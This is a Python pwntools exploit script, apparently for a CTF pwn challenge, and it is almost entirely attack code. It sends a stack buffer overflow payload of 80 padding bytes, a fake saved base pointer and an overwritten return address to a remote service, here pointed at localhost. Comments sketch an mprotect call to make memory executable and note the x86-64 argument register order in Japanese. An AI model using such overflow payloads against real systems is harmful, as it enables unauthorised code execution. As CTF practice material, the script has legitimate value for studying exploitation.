#!/usr/bin/python
#coding: utf-8

from pwn import *

# r = remote("milkyway.chal.mmactf.link",1641)
r = remote("localhost",11111)
payload = 'A'*80
payload += p64(0x6012c9) # rbp
payload += p64(0x4008b4)
payload += '\n'

r.write(payload)
r.read()
r.write('1\n')
r.read()
print r.read()
sleep(10)
r.close()

# rax=printf(0x1c83)
# mprotect(0x00602000,0x21000,7)
# rdi = 0x00602000 , rsi = 0x21000 , rdx = 7
# mprotect = rax 10
# 一引数からrdi, rsi, rdx, rcx, r8, r9の順でセットされ
